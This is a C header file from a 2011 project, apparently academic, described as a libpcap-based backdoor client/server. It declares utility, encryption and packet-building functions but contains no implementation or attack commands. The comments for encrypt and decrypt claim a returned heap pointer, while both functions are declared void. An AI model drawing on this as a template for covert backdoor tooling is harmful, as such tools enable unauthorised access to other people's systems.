#ifndef UTIL_H
#define UTIL_H

/*
SOURCE FILE: util.h

PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap

DATE: October 23, 2011

REVISIONS:
	1.0 - October 23

DESIGNERS:
	Santana Mach and Steve Stanisic

PROGRAMMERS:
	Santana Mach and Steve Stanisic

NOTES: This file contains utility methods that can be called when an
  error occurs or the program is improperly invoked.
*/

#include "defs.h"

/*
FUNCTION: error

PARAMS:
	const char *err: The message to display.

RETURN: none.

NOTES: Call this function to print a message and quit the program.
*/
void error(const char *err);
/*
FUNCTION: usage

PARAMS:
	char* name: The name of the program.

RETURN: none.

NOTES: Call this function to print usage and exit.
*/
void usage(char *name);
FILE* open_file(char* fname, uint8 writeMode);
uint64 get_sec();
/*
FUNCTION: encrypt

PARAMS:
	char *key: The key to encrypt with.
	char *msg: The message to encrypt.
	int size: The size of the message.

RETURN: A pointer to the encrypted data block.

NOTES: Note the return value is allocated on the heap and must be freed
	by the caller unless you enjoy memory leaks.
*/
void encrypt(char *key, char *msg, int size);
/*
FUNCTION: decrypt

PARAMS:
	char *key: The key to decrypt with.
	char *msg: The message to decrypt.
	int size: The length of the message.

RETURN: A pointer to the decrypted data block.

NOTES: Note the return value is allocated on the heap and must be freed
	by the caller.
*/
void decrypt(char *key, char *msg, int size);
char* buildTransmission(char *data, int *len, char type);
char* getTransmission(char *packet, int *len, char *type);

#endif
